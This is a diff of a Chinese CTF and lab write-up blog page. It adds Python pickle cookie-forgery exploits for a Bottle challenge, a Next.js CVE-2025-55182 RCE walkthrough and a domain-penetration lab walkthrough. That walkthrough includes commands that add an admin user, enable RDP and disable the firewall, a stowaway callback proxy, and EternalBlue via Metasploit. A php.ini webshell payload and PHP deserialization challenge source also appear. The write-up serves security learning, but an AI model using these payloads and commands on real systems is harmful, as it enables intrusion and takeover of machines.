@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/img/image-20260210225610925.png">
 <meta property="article:published_time" content="2026-02-08T15:19:50.000Z">
-<meta property="article:modified_time" content="2026-02-10T14:56:24.132Z">
+<meta property="article:modified_time" content="2026-03-02T12:40:47.664Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://gitee.com/bobrocket/img/raw/master/img/image-20260210225610925.png">
@@ -219,7 +219,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('https://pic.imgdb.cn/item/62c579525be16ec74a579b15.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('https://gitee.com/bobrocket/img/raw/master/img/62c579525be16ec74a579b15.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -253,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          2.2k 字
         
       </span>
     
@@ -264,7 +264,7 @@
         
         
         
-          14 分钟
+          19 分钟
         
       </span>
     
@@ -306,7 +306,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年2月10日 晚上
+                    本文最后更新于 2026年3月2日 晚上
                   
                 
               </p>
@@ -344,6 +344,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bottle<br><br>SECRET = <span class="hljs-string">&quot;h3ckTheworld123&quot;</span><br>COOKIE_NAME = <span class="hljs-string">&quot;name&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        code = <span class="hljs-string">&quot;int(open(&#x27;/flag&#x27;).read())&quot;</span><br>        <br>        <span class="hljs-comment">#code = &quot;exec(\&quot;raise Exception(open(&#x27;/flag&#x27;).read())\&quot;)&quot;</span><br>        <br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (code,))<br><br>payload = (COOKIE_NAME, Exploit())<br>encoded_value = bottle.cookie_encode(payload, SECRET)<br><br><span class="hljs-built_in">print</span>(encoded_value.decode())<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260209003551781.png" srcset="/img/loading.gif" lazyload alt="image-20260209003551781"></p>
+<h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>上面那个是我照着Gemini瞎写的，后来读到了Acc1oFl4g师哥的博客，学习了一下正规解法</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Python1111111/article/details/147113678?spm=1001.2014.3001.5501">快速理解bottle模板的set_cookie和get_cookie的原理，利用get_cookie伪造cookie进行pickle反序列化执行命令_ctf bottle-CSDN博客</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response,run, route<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cmd</span>():<br>     <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>         <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&quot;</span>,))<br><br>c = cmd()<br> <span class="hljs-comment">#session = &#123;&quot;name&quot;:c&#125;</span><br>response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>,c,secret=<span class="hljs-string">&quot;h3ckTheworld123&quot;</span>)<br><span class="hljs-built_in">print</span>(response._cookies)<br></code></pre></td></tr></table></figure>
+
 <h2 id="ez-uns"><a href="#ez-uns" class="headerlink" title="ez_uns"></a>ez_uns</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acc1oFl4g</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shql</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tou</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exec</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;tou, <span class="hljs-string">&#x27;S:&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$gxn</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;tou));<br>            <span class="hljs-variable">$gxngxngxn</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$gxn</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$gxn</span> != <span class="hljs-variable language_">$this</span>-&gt;tou &amp;&amp; <span class="hljs-variable">$gxngxngxn</span> <span class="hljs-keyword">instanceof</span> Amoda) &#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-variable">$gxngxngxn</span>-&gt;<span class="hljs-title function_ invoke__">act</span>());<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;不会本地调试怕是写不出来了&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;shql == <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Amoda</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$q1</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$q2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">act</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;q1) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;q2)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;不会本地调试怕是写不出来了&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;q1 . <span class="hljs-string">&#x27;不会本地调试怕是写不出来了&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;q2;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$result</span>, <span class="hljs-string">&#x27;convert&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;不会本地调试怕是写不出来了&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$web</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;webweb&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$web</span>, <span class="hljs-string">&#x27;admin&#x27;</span>) !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$web</span>, <span class="hljs-string">&#x27;Amoda&quot;:&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br><br>    <span class="hljs-keyword">exit</span> (<span class="hljs-string">&quot;不会本地调试怕是写不出来了&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$webb</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$web</span>);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;不会本地调试怕是写不出来了&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>这个题逻辑还是比较清晰的，主要就是几个WAF的绕过</p>
@@ -381,6 +385,57 @@
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">log_errors = On</span><br><span class="language-xml">html_errors = Off</span><br><span class="language-xml">error_log = ./shell.php</span><br><span class="language-xml">date.timezone = &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260209012726229.png" srcset="/img/loading.gif" lazyload alt="image-20260209012726229"></p>
+<h2 id="Arknights-solver"><a href="#Arknights-solver" class="headerlink" title="Arknights_solver"></a>Arknights_solver</h2><p>这次真是吃了不知道Next.js的亏了，不然至少这道题和域渗透1都能拿下</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302152126111.png" srcset="/img/loading.gif" lazyload alt="image-20260302152126111"></p>
+<p>查看源码确定是有漏洞的版本</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/vuls/461169.html">漏洞复现：React Next.js 远程命令执行漏洞(CVE-2025-55182 CVE-2025-66478)复现 - FreeBuf网络安全行业门户</a></p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302152240550.png" srcset="/img/loading.gif" lazyload alt="image-20260302152240550"></p>
+<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>通过这个题入门一下域渗透</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13751274.html#_labelTop">内网渗透之初识域渗透 - 只言 - 博客园</a></p>
+<p>那么下面看一下这三台机器的结构</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302180227188.png" srcset="/img/loading.gif" lazyload alt="image-20260302180227188"></p>
+<p>结合虚拟网卡配置我们不难发现内网是192.168.50.0，外网是192.168.80.0，我们把kali也改成NAT模式这样kali也能访问的外网机器</p>
+<p>打开<a target="_blank" rel="noopener" href="http://192.168.80.121:3000/%E5%8F%91%E7%8E%B0%E5%8F%88%E6%98%AFNext.js%E6%A1%86%E6%9E%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E6%89%93CVE%E6%8B%BF%E5%88%B0%E5%A4%96%E7%BD%91%E6%9C%BA%E5%99%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90">http://192.168.80.121:3000/发现又是Next.js框架，所以先打CVE拿到外网机器管理员权限</a></p>
+<p>可以用上面的方法，也可以用<a target="_blank" rel="noopener" href="https://github.com/zzhorc/CVE-2025-55182">zzhorc&#x2F;CVE-2025-55182: CVE-2025-55182复现环境及RCE回显poc</a></p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302185259994.png" srcset="/img/loading.gif" lazyload alt="image-20260302185259994"></p>
+<p>下面我们获得管理员权限</p>
+<p>新建用户suny</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> scanner_with_rce.py -u http://192.168.80.121:3000/ -c <span class="hljs-string">&quot;net user suny 123 /add&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将suny加入管理员组</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> scanner_with_rce.py -u http://192.168.80.121:3000/ -c <span class="hljs-string">&quot;net localgroupAdministrators suny /add&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>开启远程桌面</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> scanner_with_rce.py -u http://192.168.80.121:3000/ -c <span class="hljs-string">&quot;wmic rdtoggle where AllowTSConnections=0 call SetAllowTSConnections 1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>关闭防火墙</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">python</span> scanner_with_rce.py -u http:<span class="hljs-comment">//192.168.80.121:3000/ -c &quot;netsh advfirewall set allprofiles state off&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>重启主机</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> scanner_with_rce.py -u http://192.168.80.121:3000/ -c <span class="hljs-string">&quot;shutdown /r /t 0&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>下面上rdp远程连接桌面</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302190721822.png" srcset="/img/loading.gif" lazyload alt="image-20260302190721822"></p>
+<p>成功拿下外网机器管理员权限</p>
+<p>传一个fscan上去扫端口</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302190929364.png" srcset="/img/loading.gif" lazyload alt="image-20260302190929364"></p>
+<p>域成员机可以直接打永恒之蓝</p>
+<p>上stowaway代理让kali可以访问到内网</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302191305629.png" srcset="/img/loading.gif" lazyload alt="image-20260302191305629"></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./linux_x64_admin</span> -l 1234 -s 123<br>windows_x64_agent.exe -c 192.168.80.128<span class="hljs-function">:1234</span> -s 123 <span class="hljs-params">--reconnect</span> 8<br></code></pre></td></tr></table></figure>
+
+<p>连接成功，我们开启socks5代理</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302191443159.png" srcset="/img/loading.gif" lazyload alt="image-20260302191443159"></p>
+<p>改⼀下proxychains的配置</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302191527874.png" srcset="/img/loading.gif" lazyload alt="image-20260302191527874"></p>
+<p>直接上MSF</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302192039552.png" srcset="/img/loading.gif" lazyload alt="image-20260302192039552"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">proxychains msfconsole<br>search MS17<span class="hljs-number">-010</span><br>use <span class="hljs-number">0</span> <br><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.50.12</span><br>show <span class="hljs-comment">payloads</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/x64/<span class="hljs-comment">meterpreter</span>/bind_tcp<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302191850818.png" srcset="/img/loading.gif" lazyload alt="image-20260302191850818"></p>
+<p>拿下域管理密码和哈希</p>
+<p>直接登录Windows server2008</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/img/image-20260302203259474.png" srcset="/img/loading.gif" lazyload alt="image-20260302203259474"></p>
 
                 
               </div>
